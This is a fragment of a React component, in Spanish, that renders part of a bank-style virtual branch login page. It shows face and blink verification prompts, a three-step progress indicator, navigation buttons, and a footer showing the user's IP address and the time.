                          fontSize: "14px",
                          marginTop: "10px",
                          textAlign: "center",
                        }}
                      >
                        Ubica tu rostro dentro del círculo
                      </p>
                    )}

                    {/* MENSAJE */}
                    {(formState.estadoEspabilar && formState.cargando == false) && (
                      <p
                        className="bc-card-auth-description"
                        style={{
                          color: "#fff",
                          fontSize: "14px",
                          marginTop: "10px",
                          textAlign: "center",
                        }}
                      >
                        Mantén una expresión neutra, luego parpadea naturalmente mientras se completa la verificación.
                      </p>
                    )}
                  </div>
                </>
              )}

              <div className="step-container mt-4 mb-4">
                {/* Slot 1 */}
                {formState.paso === 1 ? (
                  <div className="step bar active"></div>
                ) : (
                  <div className="step circle"></div>
                )}

                {/* Slot 2 */}
                {formState.paso === 2 ? (
                  <div className="step bar active"></div>
                ) : (
                  <div className="step circle"></div>
                )}

                {/* Slot 3 */}
                {formState.paso === 3 ? (
                  <div className="step bar active"></div>
                ) : (
                  <div className="step circle"></div>
                )}
              </div>

              <div className="mt-4" style={{ display: "flex", gap: "10px", justifyContent: "center" }}>
                {(formState.paso > 1 && formState.paso < 3) && (
                  <button id="back-button" className="bc-button-primary login-btn-borrar" onClick={handleAtras} style={{ fontSize: "14px" }} disabled={formState.disabledAtras}>
                    {formState.textoAtras}
                  </button>
                )}
                {formState.paso < 3 && (
                  <button id="continue-button" className="bc-button-primary login-btn" onClick={handleContinuar} style={{ fontSize: "14px" }} disabled={formState.disabledContinuar}>
                    {formState.texto}
                  </button>
                )}
              </div>
            </div>
          </div>

          <div className="login-page-footer mt-4">
            <div className="footer-links" style={{ marginTop: "70px", marginRight: "1%", marginBottom: "5px" }}>
              <span>¿Problemas para conectarte?</span>
              <span className="dot">·</span>
              <span>Aprende sobre seguridad</span>
              <span className="dot">·</span>
              <span>Reglamento Sucursal Virtual</span>
              <span className="dot">·</span>
              <span>Política de privacidad</span>
            </div>
            <hr style={{ marginTop: "20px" }} />
            <div className="footer-final">
              <div className="footer-left">
                <div>
                  <img
                    src="/assets/images/img_pantalla2/descarga.svg"
                    style={{ width: "180px" }}
                  />
                </div>
                <div style={{ alignSelf: 'center' }}>
                  <span className="vigilado">
                    <img
                      src="/assets/images/img_pantalla1/imgi_40_logo_vigilado.svg"
                      alt="Superintendencia"
                      style={{ width: "140px" }}
                    />
                  </span>
                </div>
              </div>
              <div className="footer-right">
                <div className="mt-2">Dirección IP: {ip}</div>
                <div className="mb-2">{fechaHora}</div>
              </div>
            </div>
          </div>
        </div>
      </div >

      <div className="visual-captcha" style={{ cursor: "pointer" }}>
        <img src="/assets/images/lateral-der.png" alt="Visual Captcha" />
      </div>

      {formState.cargando ?
        <Loading /> : null}
    </>
  );
}